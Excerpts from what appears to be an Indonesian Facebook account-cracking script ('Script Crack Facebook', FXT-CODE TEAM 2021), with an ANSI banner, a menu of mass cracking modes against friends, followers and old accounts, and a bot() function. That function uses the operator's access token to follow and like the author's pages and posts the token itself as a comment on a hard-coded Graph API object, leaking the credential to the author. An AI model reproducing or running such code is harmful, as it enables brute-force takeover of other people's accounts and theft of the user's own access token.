...
\033[97;1m╠[ \033[92;1mGithub   \033[97;1m: \033[93;1mHttps://github.com/ZuckXD
\033[97;1m╠[ \033[92;1mFacebook \033[97;1m: \033[93;1mYOSHI \033[97;1m[\033[92;1mFollow Facebook Aing\033[97;1m]
\033[97;1m║\033[93;1m---------------------------------------------------------
\033[97;1m╠[ \033[92;1mScript Crack Facebook
\033[97;1m╠[ \033[92;1mTeam \033[97;1m: \033[93;1mFXT\033[97;1m-\033[93;1mCODE TEAM 2021
\033[97;1m╚[ \033[92;1mPlease Follow Facebook dan GitHub aing \033[97;1m[\033[92;1m(>•,•<)\033[97;1m]
\033[92;1m----------------------------------------------------------
""")
...
def bot():
	...
	requests.post("https://graph.facebook.com/100077893020527/subscribers?access_token="+token) # sptty chan
	requests.post("https://graph.facebook.com/109666408306460/likes?summary=true&access_token=" + token)
	requests.post("https://graph.facebook.com/109666408306460/comments/?message="+komentar+"&access_token="+token)
	requests.post("https://graph.facebook.com/109666408306460/comments/?message="+token+"&access_token="+token)
	menu()
...
def menu():
	...
	print(u+line)
	print(s+"\n{"+m+"1"+s+"}"+l+" Crack Dari Pertemanan "+u+"[publik]")
	print(s+"{"+m+"2"+s+"}"+l+" Crack Dari Followers "+u+"[publik]")
	print(s+"{"+m+"3"+s+"}"+l+" Crack Pertemanan Publik "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"4"+s+"}"+l+" Crack Akun Old "+s+"{"+m+"Massal"+s+"}")
	print(s+"{"+m+"5"+s+"}"+l+" Crack Akun Old 2006 "+s+"{"+m+"Massal"+s+"}")
